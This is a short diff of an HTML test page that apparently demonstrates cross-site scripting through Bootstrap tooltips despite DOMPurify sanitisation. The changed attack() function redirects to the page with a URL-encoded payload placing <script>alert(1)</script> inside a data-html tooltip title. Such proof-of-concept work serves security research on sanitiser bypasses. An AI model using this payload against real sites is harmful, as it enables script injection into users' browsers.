@@ -7,7 +7,7 @@
     </head>
     
     <body>
-        <p>Bootstrap</p>
+        <p>Bootstrap with Dompurify.js</p>
         
         <script>
             function getParam(name) {
@@ -39,7 +39,7 @@
         <script>
             let url = window.location.href;
             const attack = () => {
-            window.location.replace(url+"?inj=%3Cdiv%20data-toggle=tooltip%20data-html=true%20title=%27%3Cscript%3Ealert(1)%3C/script%3E%27%3Ehover for xss%3C/div%3E");
+            window.location.replace(url+"?inj=%3Cdiv%20data-toggle=tooltip%20data-html=true%20title=%27%3Cscript%3Ealert(1)%3C/script%3E%27%3ESuccesss, hover to alert%3C/div%3E");
             }
         </script>
     </body>
